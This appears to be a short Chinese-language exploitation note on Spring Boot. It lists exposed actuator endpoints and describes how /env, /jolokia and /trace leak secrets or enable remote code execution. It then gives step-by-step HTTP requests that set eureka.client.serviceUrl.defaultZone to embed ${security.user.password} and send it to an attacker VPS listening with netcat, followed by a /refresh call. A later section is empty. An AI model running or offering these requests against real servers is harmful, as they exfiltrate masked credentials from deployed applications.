## Spring Boot漏洞利用

#### 一、配置不当而暴露的默认内置路由
	/actuator
	/auditevents
	/autoconfig
	/beans
	/caches
	/conditions
	/configprops
	/docs
	/dump
	/env
	/flyway
	/health
	/heapdump
	/httptrace
	/info
	/intergrationgraph
	/jolokia
	/logfile
	/loggers
	/liquibase
	/metrics
	/mappings
	/prometheus
	/refresh
	/scheduledtasks
	/sessions
	/shutdown
	/trace
	/threaddump
	/actuator/auditevents
	/actuator/beans
	/actuator/health
	/actuator/conditions
	/actuator/configprops
	/actuator/env
	/actuator/info
	/actuator/loggers
	/actuator/heapdump
	/actuator/threaddump
	/actuator/metrics
	/actuator/scheduledtasks
	/actuator/httptrace
	/actuator/mappings
	/actuator/jolokia
	/actuator/hystrix.stream

	/env、/actuator/env
	GET 请求 /env 会泄露环境变量信息，或者配置中的一些用户名，当程序员的属性名命名不规范 (例如 password 写成 psasword、pwd) 时，会泄露密码明文；
	同时有一定概率可以通过 POST 请求 /env 接口设置一些属性，触发相关 RCE 漏洞。

	/jolokia
	通过 /jolokia/list 接口寻找可以利用的 MBean，触发相关 RCE 漏洞；

	/trace
	一些 http 请求包访问跟踪信息，有可能发现有效的 cookie 信息

#### 二、获取被星号脱敏的密码的明文一

	1、找到想要获取的属性名
	GET 请求目标网站的/env或/actuator/env接口，搜索******关键词,找到想要获取的被星号 * 遮掩的属性值对应的属性名。

	2、VPS使用nc监听HTTP请求
	nc -lvk 80

	3、设置 eureka.client.serviceUrl.defaultZone 属性
	spring 1.x
	POST /env
	Content-Type: application/x-www-form-urlencoded

	eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip

	spring 2.x
	POST /actuator/env
	Content-Type: application/json

	{"name":"eureka.client.serviceUrl.defaultZone","value":"http://value:${security.user.password}@your-vps-ip"}

![01](1.png)

	4、刷新配置
	spring 1.x
	POST /refresh
	Content-Type: application/x-www-form-urlencoded

	spring 2.x
	POST /actuator/refresh
	Content-Type: application/json

![01](2.png)

	5、解码
![03](1.jpg)


#### 三、获取被星号脱敏的密码的明文二





#### 参考链接
	https://www.t00ls.net/articles-56671.html